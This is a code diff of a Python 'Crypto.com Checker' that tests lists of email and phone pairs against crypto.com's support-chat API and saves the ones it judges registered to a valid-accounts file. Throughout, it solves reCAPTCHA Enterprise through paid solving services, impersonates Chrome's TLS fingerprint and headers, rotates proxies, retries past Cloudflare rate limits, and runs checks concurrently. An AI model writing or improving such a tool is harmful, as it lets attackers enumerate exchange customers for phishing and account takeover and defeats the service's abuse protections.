@@ -1,47 +1,70 @@
 import random
 import toml
-import curl_cffi
 import re
 import time
 import phonenumbers
 import pycountry
 import json
+import requests
+import asyncio
+import capsolver
 
-from uuid import uuid4
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from functools import wraps
 from enum import Enum
+from uuid import uuid4
+from functools import wraps
 from logmagix import Logger, Home
 from phonenumbers import geocoder
+from nextcaptcha import NextCaptchaAPI
+from rnet import Emulation, Proxy, Method, Client 
 
 with open('input/config.toml') as f:
     config = toml.load(f)
 
 DEBUG = config['dev'].get('Debug', False)
 
-log = Logger()
+if config["captcha"].get("service") == "nextcaptcha":
+    solver = NextCaptchaAPI(client_key=config['captcha'].get('api_key', ""), open_log=False)
+elif config["captcha"].get("service") == "capsolver":
+    capsolver.api_key = config['captcha'].get('api_key', "")
+else:
+    raise ValueError("Unsupported captcha service specified in config.toml")
+
+log = Logger(log_file='logs/output.log' if DEBUG else None)
 
 def debug(func_or_message, *args, **kwargs) -> callable:
     if callable(func_or_message):
-        @wraps(func_or_message)
-        def wrapper(*args, **kwargs):
-            result = func_or_message(*args, **kwargs)
-            if DEBUG:
-                log.debug(f"{func_or_message.__name__} returned: {result}")
-            return result
-        return wrapper
+        if asyncio.iscoroutinefunction(func_or_message):
+            @wraps(func_or_message)
+            async def async_wrapper(*args, **kwargs):
+                result = await func_or_message(*args, **kwargs)
+                if DEBUG:
+                    log.debug(f"{func_or_message.__name__} returned: {result}")
+                return result
+            return async_wrapper
+        else:
+            @wraps(func_or_message)
+            def wrapper(*args, **kwargs):
+                result = func_or_message(*args, **kwargs)
+                if DEBUG:
+                    log.debug(f"{func_or_message.__name__} returned: {result}")
+                return result
+            return wrapper
     else:
         if DEBUG:
             log.debug(f"Debug: {func_or_message}")
 
-def debug_response(response) -> None:
+async def debug_response(response) -> None:
     debug(response.headers)
-    debug(response.cookies.get_dict())
+    debug(response.cookies)
     try:
-        debug(response.text)
+        debug(await response.text())
     except:
         debug(response.content)
-    debug(response.status_code)
+    
+    try:
+        debug(response.status.as_int())
+    except:
+        debug(response.status_code)
 
 class Status(Enum):
     INVALID = 0
@@ -62,20 +85,21 @@ class Miscellaneous:
                     return None
                 
                 proxy_choice = random.choice(proxies)
-                proxy_dict = {
-                    "http": f"http://{proxy_choice}",
-                    "https": f"http://{proxy_choice}"
-                }
-                debug(f"Using proxy: {proxy_choice}")
-                return proxy_dict
+                proxy_list = [
+                    Proxy.all(
+                        url=f"http://{proxy_choice}" if not proxy_choice.startswith(("http://", "https://")) else proxy_choice,
+                    )
+                ]
+
+            debug(f"Proxies configured: {proxies}")
+            return proxy_list
         except FileNotFoundError:
             log.failure("Proxy file not found. Running in proxyless mode.")
             return None
 
     @debug 
     def get_user_agent(self) -> str:
-        response = curl_cffi.get("https://raw.githubusercontent.com/ptraced/latest-useragents/refs/heads/main/useragents.json")
-
+        response = requests.get("https://raw.githubusercontent.com/ptraced/latest-useragents/refs/heads/main/useragents.json")
         if response.status_code == 200:
             # Try standard JSON parse first
             try:
@@ -85,8 +109,8 @@ class Miscellaneous:
             except Exception:
                 # Try a tolerant parse: remove trailing commas before closing brackets/braces
                 try:
-                    text = response.text
-                    cleaned = re.sub(r",\s*(?=[\]}])", "", text)
+                    text = response.content.decode('utf-8')
+                    cleaned = re.sub(r",\s*[\r\n]+\s*([\]}])", r"\1", text)
                     parsed = json.loads(cleaned)
                     ua_list = parsed.get("Desktop_Useragents")
                     if ua_list:
@@ -125,55 +149,137 @@ class Miscellaneous:
         except Exception as e:
             return {"error": str(e)}
 
+    @debug
+    def solve_captcha(self, site_key: str = "6LekUvoqAAAAANBtLcXfj3X9l3QYgTZgr1qjphCZ", url: str = "https://chat.crypto.com", action: str = "TEXT", invisible: bool = True, proxies: list = None) -> str | None:
+        start = time.time()
+        service = config["captcha"].get("service")
+        
+        if service == "nextcaptcha":
+            log.info("Solving captcha with NextCaptcha...")
+            result = solver.recaptchav2enterprise(website_url=url, website_key=site_key, is_invisible=invisible, page_action=action)
+        elif service == "capsolver":
+            log.info("Solving captcha with Capsolver...")
+            payload = {
+                "type": "ReCaptchaV2EnterpriseTaskProxyLess",
+                "websiteURL": url,
+                "websiteKey": site_key,
+                "isInvisible": invisible,
+                "pageAction": action,
+                "websiteURL": url
+            }
+            if proxies:
+                payload["type"] = "ReCaptchaV2EnterpriseTask"
+                proxy_obj = proxies[0]  # use first proxy
+                proxy_url = proxy_obj.url
+                proxy_str = proxy_url.replace("http://", "").replace("@", ":")
+                payload["proxyType"] = "http"
+                payload["proxy"] = proxy_str
+            result = capsolver.solve(payload)
+        else:
+            log.failure("Unsupported captcha service")
+            return None
+
+        debug(result)
+        
+        if service == "nextcaptcha":
+            if not result.get("errorId"):
+                token = result["solution"].get("gRecaptchaResponse")
+                log.message("NextCaptcha", f"Successfully solved Captcha: {token[:44]}...", start, time.time())
+                return token
+            else:
+                log.failure(f"Failed to solve Captcha: {result.get('errorDescription')}")
+        elif service == "capsolver":
+            if "gRecaptchaResponse" in result:
+                token = result["gRecaptchaResponse"]
+                log.message("Capsolver", f"Successfully solved Captcha: {token[:44]}...", start, time.time())
+                return token
+            else:
+                log.failure(f"Failed to solve Captcha: {result}")
+        
+        return None
+
 class AccountChecker:
-    def __init__(self, misc: Miscellaneous, proxy_dict: dict):
-        self.id = f"web{str(uuid4())}"
+    def __init__(self, misc: Miscellaneous, proxy_list: list):
+        self.id = f"web{str(uuid4())[3:]}"
         self.client_chat_id = None
+        self.token = None
         self.misc = misc
+        self.proxy_list = proxy_list
 
         # Initialize the session
-        self.session = curl_cffi.Session(impersonate="chrome136", http_version="v1")
-
-        self.session.headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
-            "Connection": "keep-alive",
-            "Content-Type": "application/json",
-            "Host": "alfred-gateway.crypto.com",
-            "Origin": "https://chat.crypto.com",
-            "Referer": "https://chat.crypto.com/",
-            "sec-ch-ua": '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "same-site",
-            "User-Agent": misc.get_user_agent(),
-            "X-CRYPTO-USER-UUID": self.id,
-            "X-User-Type": "web"
+        self.headers = {
+            'accept': 'application/json, text/plain, */*',
+            'accept-encoding': 'gzip, deflate, br, zstd',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'connection': 'keep-alive',
+            'content-type': 'application/json',
+            'host': 'alfred-gateway.crypto.com',
+            'origin': 'https://chat.crypto.com',
+            'referer': 'https://chat.crypto.com/',
+            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': self.misc.get_user_agent(),
+            'x-crypto-user-uuid': self.id,
+            'x-user-type': 'web',
         }
-        self.session.proxies = proxy_dict
+
+        debug(self.id)
+        
+        self.session = Client(impersonate=Emulation.Chrome141, proxies=proxy_list, headers=self.headers)
+
+    async def _retry_request(self, method, url, **kwargs):
+        max_retries = 2
+        for _ in range(max_retries):
+            response = await self.session.request(method, url, **kwargs)
+            if response.status.as_int() == 429:
+                log.warning(f"429 Too Many Requests (cloudflare block). Retrying...")
+                await asyncio.sleep(2)
+            else:
+                return response
+        log.failure(f"Max retries reached for {url}")
+        return response
 
     @debug
-    def get_authorization_token(self, id: str = None) -> str | None:
-        data = {"user_id": id if id is not None else self.id}
+    async def get_authorization_token(self, id: str = None) -> str | None:
+        response = await self._retry_request(Method.OPTIONS, "https://alfred-gateway.crypto.com/user/token")
 
-        response = self.session.post("https://alfred-gateway.crypto.com/user/token", json=data)
+        await debug_response(response)
 
-        debug_response(response)
+        captcha_token = self.misc.solve_captcha(invisible=False, action="TOKEN", proxies=self.proxy_list)
 
-        if response.status_code == 201:
-            token = response.json().get("token")
-            self.session.headers['Authorization'] = f"Bearer {token}"
-             
-            return token
+        if not captcha_token:
+            return None
+
+        data = {
+            "user_id": id if id is not None else self.id,
+            "channel_id": "web",
+            "recaptcha_token": captcha_token
+        }
+
+        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/user/token", json=data)
+
+        await debug_response(response)
+
+        if response.status.as_int() == 201:
+            resp_json = await response.json()
+            self.token = resp_json.get("token")
+
+            return self.token
         else:
-            log.failure(f"Failed to fetch authorization token: {response.text}, {response.status_code}")
+            text = await response.text()
+            if isinstance(text, str):
+                log.failure(f"Failed to fetch authorization token: {text}, {response.status.as_int()}")
+            else:
+                log.failure("Failed to fetch authorization token: Response text is not a string.")
+
         return None
 
     @debug
-    def create_chat(self) -> bool:
+    async def create_chat(self) -> bool:
         data = {
             "channel_id": "web",
             "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
@@ -181,42 +287,67 @@ class AccountChecker:
             "country": "FRA"
         }
 
-        response = self.session.post("https://alfred-gateway.crypto.com/conversations/messages", json=data)
+        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/messages", headers={"Authorization": f"Bearer {self.token}"}, json=data)
         
-        debug_response(response)
+        await debug_response(response)
 
-        if response.status_code == 201:
+        if response.status.as_int() == 201:
             return True
         else:
-            log.failure(f"Failed to create chat: {response.text}, {response.status_code}")
-        
+            text = await response.text()
+            if isinstance(text, str):
+                log.failure(f"Failed to create chat: {text}, {response.status.as_int()}")
+            else:
+                log.failure("Failed to create chat: Response text is not a string.")
+
         return False
     
     @debug
-    def send_initial_message(self) -> bool:
+    async def send_initial_message(self) -> bool:
+        captcha_token = self.misc.solve_captcha(action="ESCALATE", proxies=self.proxy_list)
+    
+        if not captcha_token:
+            return None
+
+
         data = {
-            "channel_id": "web",
-            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
-            "content": "",  
-            "message_type": 12,
-            "transient": True
+            'channel_id': 'web',
+            'influencer_id': 'ab7d6750-10a2-4a09-87cd-6f2b68be100f',
+            'content': '',
+            'message_type': 12,
+            'transient': True,
+            'recaptcha_token': captcha_token
         }
 
-        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)
+        response = await self._retry_request(Method.OPTIONS, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)
+        await debug_response(response)
 
-        debug_response(response)
+        if response.status.as_int() != 204:
+            text = await response.text()
+            log.failure(f"Failed OPTIONS request before sending initial message: {text}, {response.status.as_int()}")
+            return False
 
-        if response.status_code == 201:
-            return True
-        elif "Access denied" in response.text:
-            log.failure("Failed to send initial message, tls issue.")
-        else:
-            log.failure(f"Failed to send initial message: {response.text}, {response.status_code}")
+        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)
+        await debug_response(response)
         
+
+        if response.status.as_int() == 201:
+            return True
+        elif "Access denied" in await response.text():
+            log.failure("Access denied in response text.")
+        else:
+            text = await response.text()
+            log.failure(f"Failed to send initial message: {text}, {response.status.as_int()}")
+         
         return False
 
     @debug
-    def set_language(self) -> str | None:
+    async def set_language(self) -> str | None:
+        captcha_token = self.misc.solve_captcha(proxies=self.proxy_list)
+
+        if not captcha_token:
+            return None
+
         data = {
             "channel_id": "web",
             "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
@@ -224,7 +355,7 @@ class AccountChecker:
             "new_conversation": True,
             "message_type": 12,
             "language": "en",
-            "assistant_id": "en-0-8-2",
+            "assistant_id": "en-0-8-0",
             "assistant_name": "General Support",
             "node_id": "21916380-9a81-4b10-935b-df8850bc6984",
             "session_info": {
@@ -233,28 +364,35 @@ class AccountChecker:
                 "country": "FRA",
                 "currency": "EUR",
                 "language": "en",
-                "assistant_id": "en-0-8-2",
+                "assistant_id": "en-0-8-0",
                 "assistant_name": "General Support"
-            }
+            },
+            "recaptcha_token": captcha_token
         }
 
-        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)
+        response = await self._retry_request(Method.OPTIONS, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"})
 
-        debug_response(response)
+        await debug_response(response)
 
-        if response.status_code == 201:
-            chat_id = response.json().get("client_chat_id")
+        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)
+
+        await debug_response(response)
+
+        if response.status.as_int() == 201:
+            resp_json = await response.json()
+            chat_id = resp_json.get("client_chat_id")
             
             self.client_chat_id = chat_id
             
             return chat_id
         else:
-            log.failure(f"Failed to set language: {response.text}, {response.status_code}")
+            text = await response.text()
+            log.failure(f"Failed to set language: {text}, {response.status.as_int()}")
         
         return None
     
     @debug
-    def set_type(self) -> bool:
+    async def set_type(self) -> bool:
         data = {
             "channel_id": "web",
             "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
@@ -263,19 +401,20 @@ class AccountChecker:
             "client_chat_id": self.client_chat_id
         }
 
-        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)
+        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"},  json=data)
 
-        debug_response(response)
+        await debug_response(response)
 
-        if response.status_code == 201:
+        if response.status.as_int() == 201:
             return True
         else:
-            log.failure(f"Failed to set phone: {response.text}, {response.status_code}")
+            text = await response.text()
+            log.failure(f"Failed to set phone: {text}, {response.status.as_int()}")
         
         return False
 
     @debug
-    def set_phone(self) -> bool:
+    async def set_phone(self) -> bool:
         data = {
             "channel_id": "web",
             "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
@@ -284,19 +423,25 @@ class AccountChecker:
             "client_chat_id": self.client_chat_id
         }
 
-        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)
+        response = await self._retry_request(Method.OPTIONS, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"})
 
-        debug_response(response)
+        await debug_response(response)
 
-        if response.status_code == 201:
+        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)
+
+
+        await debug_response(response)
+
+        if response.status.as_int() == 201:
             return True
         else:
-            log.failure(f"Failed to set agreement: {response.text}, {response.status_code}")
+            text = await response.text()
+            log.failure(f"Failed to set phone: {text}, {response.status.as_int()}")
         
         return False
     
     @debug
-    def set_agreement(self) -> bool:
+    async def set_agreement(self) -> bool:
         data = {
             "channel_id": "web",
             "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
@@ -305,19 +450,20 @@ class AccountChecker:
             "client_chat_id": self.client_chat_id
         }
 
-        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)
+        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)
 
-        debug_response(response)
+        await debug_response(response)
 
-        if response.status_code == 201:
+        if response.status.as_int() == 201:
             return True
         else:
-            log.failure(f"Failed to set agreement: {response.text}, {response.status_code}")
+            text = await response.text()
+            log.failure(f"Failed to set agreement: {text}, {response.status.as_int()}")
         
         return False
     
     @debug
-    def set_further_assistance(self) -> bool:
+    async def set_further_assistance(self) -> bool:
         data = {
             "channel_id": "web",
             "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
@@ -326,27 +472,26 @@ class AccountChecker:
             "client_chat_id": self.client_chat_id
         }
 
-        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)
+        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)
 
-        debug_response(response)
+        await debug_response(response)
 
-        if response.status_code == 201:
+        if response.status.as_int() == 201:
             return True
         else:
-            log.failure(f"Failed to set further assistance: {response.text}, {response.status_code}")
+            text = await response.text()
+            log.failure(f"Failed to set further assistance: {text}, {response.status.as_int()}")
         
         return False
     
     @debug
-    def submit(self, email: str, phone: str) -> Status:
+    async def submit(self, email: str, phone: str) -> Status:
         phone_data = self.misc.get_phone_region(phone)
 
-        # Use != for string comparison and handle missing keys safely
         region = phone_data.get("region")
         country_name = phone_data.get("country") or "Unknown"
 
-        # Correct the logic for appending "(except New York)"
-        if country_name == "United States" and region is not "New York":
+        if country_name == "United States" and region != "New York":
             country = f"{country_name} (except New York)"
         else:
             country = country_name
@@ -359,38 +504,41 @@ class AccountChecker:
             "client_chat_id": self.client_chat_id
         }
 
-        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)
+        response = await self._retry_request(Method.POST, "https://alfred-gateway.crypto.com/conversations/text", headers={"Authorization": f"Bearer {self.token}"}, json=data)
 
-        debug_response(response)
+        await debug_response(response)
 
         debug(f"Submission payload: {data}")
 
-        if response.status_code == 201:
-            if "Thank you for" in response.json().get("text"):
+        if response.status.as_int() == 201:
+            # Ensure response.json().get("text") is a string before checking
+            resp_json = await response.json()
+            if isinstance(resp_json.get("text"), str) and "Thank you for" in resp_json.get("text"):
                 return Status.VALID
             else:
                 return Status.INVALID
         else:
-            log.failure(f"Failed to sumbit chat: {response.text}, {response.status_code}")
+            text = await response.text()
+            log.failure(f"Failed to sumbit chat: {text}, {response.status.as_int()}")
 
             return Status.ERROR
 
-def check_account(email: str, phone: str) -> bool:
+async def check_account(email: str, phone: str) -> bool:
     try:
         Misc = Miscellaneous()
         proxies = Misc.get_proxies()
         Checker = AccountChecker(Misc, proxies)
 
         log.info(f"Checking {email[:12]}...")
-        if Checker.get_authorization_token():
-            if Checker.create_chat():
-                if Checker.send_initial_message():
-                    if Checker.set_language():
-                        if Checker.set_type():
-                            if Checker.set_phone():
-                                if Checker.set_agreement():
-                                    if Checker.set_further_assistance():
-                                        status = Checker.submit(email, phone)
+        if await Checker.get_authorization_token():
+            if await Checker.create_chat():
+                if await Checker.send_initial_message():
+                    if await Checker.set_language():
+                        if await Checker.set_type():
+                            if await Checker.set_phone():
+                                if await Checker.set_agreement():
+                                    if await Checker.set_further_assistance():
+                                        status = await Checker.submit(email, phone)
 
                                         if status == Status.VALID:
                                             with open("output/valid.txt", "a", encoding='utf-8') as f:
@@ -413,7 +561,6 @@ def check_account(email: str, phone: str) -> bool:
         log.failure(f"Error during account checking process: {e}")
         return False
 
-
 def parse_account_line(line: str):
     if "," in line:  # CSV-like format
         parts = line.split(",")
@@ -434,7 +581,7 @@ def parse_account_line(line: str):
         log.warning(f"Skipping malformed account line: {line.strip()}")
         return None, None
 
-def main() -> None:
+async def main() -> None:
     try:
         Banner = Home("Crypto.com Checker", align="center", credits="discord.cyberious.xyz")
         
@@ -454,36 +601,32 @@ def main() -> None:
             log.failure('input/accounts.txt not found')
             return
 
-        # Worker that attempts check_account up to 3 times on False
-        def worker(email_phone):
+        # Semaphore to limit concurrency
+        semaphore = asyncio.Semaphore(thread_count)
+
+        async def worker(email_phone):
             email, phone = email_phone
-            max_retries = 3
-            for attempt in range(1, max_retries + 1):
-                try:
-                    success = check_account(email, phone)
-                    if success:
-                        return True
-                    else:
-                        log.warning(f"Attempt {attempt} failed for {email}. Retrying...")
-                except Exception as e:
-                    log.failure(f"Exception on attempt {attempt} for {email}: {e}")
-                time.sleep(0.5)
+            async with semaphore:
+                max_retries = config["dev"].get("MaxRetries", 3)
+                for attempt in range(1, max_retries + 1):
+                    try:
+                        success = await check_account(email, phone)
+                        if success:
+                            return True
+                        else:
+                            log.warning(f"Attempt {attempt} failed for {email}. Retrying...")
+                    except Exception as e:
+                        log.failure(f"Exception on attempt {attempt} for {email}: {e}")
+                    await asyncio.sleep(0.5)
 
-            # All retries exhausted; record into error.txt
-            with open('output/error.txt', 'a', encoding='utf-8') as ef:
-                ef.write(f"{email}:{phone}\n")
-            log.failure(f"Exhausted retries for {email}. Recorded to output/error.txt")
-            return False
+                # All retries exhausted; record into error.txt
+                with open('output/error.txt', 'a', encoding='utf-8') as ef:
+                    ef.write(f"{email}:{phone}\n")
+                log.failure(f"Exhausted retries for {email}. Recorded to output/error.txt")
+                return False
 
-        # Process accounts with a thread pool
-        with ThreadPoolExecutor(max_workers=thread_count) as executor:
-            futures = {executor.submit(worker, acc): acc for acc in accounts}
-            for fut in as_completed(futures):
-                acc = futures[fut]
-                try:
-                    fut.result()
-                except Exception as e:
-                    log.failure(f"Unhandled exception processing {acc[0]}: {e}")
+        # Process accounts concurrently
+        await asyncio.gather(*[worker(acc) for acc in accounts])
 
     except KeyboardInterrupt:
         log.info("Process interrupted by user. Exiting...")
@@ -491,4 +634,6 @@ def main() -> None:
         log.failure(f"An unexpected error occurred: {e}")
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
+
+# TOFIX: recaptcha denial 400 status code
